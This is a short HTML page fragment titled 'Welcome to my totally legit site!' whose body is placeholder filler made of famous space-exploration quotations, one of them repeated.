		<h2>Welcome to my totally legit site!</h2>
		<p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental truth to our nature, Man must explore . . . and this is exploration at its greatest.</p>

		<p>The Earth was small, light blue, and so touchingly alone, our home that must be defended like a holy relic. The Earth was absolutely round. I believe I never knew what the word round meant until I saw Earth from space.</p>

		<p>As I stand out here in the wonders of the unknown at Hadley, I sort of realize there’s a fundamental truth to our nature, Man must explore . . . and this is exploration at its greatest.</p>

		<p>We want to explore. We’re curious people. Look back over history, people have put their lives at stake to go out and explore … We believe in what we’re doing. Now it’s time to go.</p>

		<p>Buy why, some say, the moon? Why choose this as our goal? And they may as well ask why climb the highest mountain?</p>

		<p>To go places and do things that have never been done before – that’s what living is all about.</p>

		<p>You know, being a test pilot isn't always the healthiest business in the world.</p>
